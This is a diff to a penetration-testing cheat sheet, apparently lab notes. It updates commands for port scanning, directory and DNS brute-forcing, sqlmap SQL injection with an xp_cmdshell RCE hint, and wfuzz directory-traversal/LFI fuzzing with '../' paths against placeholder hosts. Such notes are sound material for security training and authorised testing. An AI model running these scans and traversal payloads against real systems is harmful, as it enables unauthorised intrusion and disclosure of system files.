@@ -3,8 +3,8 @@
 ### Discovery
 * sudo nmap -sS -sV -Pn -A ip_addr
 * File / directory discovery
-	*  wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 http://site
-	* dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u URL --full-url
+	*  wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 http://site/FUZZ
+	* dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u URL --full-url (add -e extension such as -e php for specific extension targeting) 
 	* gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301
 	* gobuster dns -d megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
 * Pw / Username discovery - cewl
@@ -141,9 +141,11 @@ Next, run `sqlmap -r sqli_login_page -p param` where param is the parameter from
 Note: The labs indicate that if the host is Windows it is highly likely this will be your RCE vector via xp_cmdshell
 
 ### Directory Traversal / LFI
-```wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://dirTravSandbox:80/relativePathing.php?path=../../../../../../../../../../FUZZ```
+```wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://site:80/index.php?path=../../../../../../../../../../FUZZ```
 
-```wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 http://homeassistant:8123/fontawesome/../../../../../../../../../../../../FUZZ```
+```wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 http://site:8080/test/../../../../../../../../../../../../FUZZ```
+
+```wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 http://site:8080/test/FUZZ```
 
 ### XXE
 If you see XML in ANY request, you should be testing for this
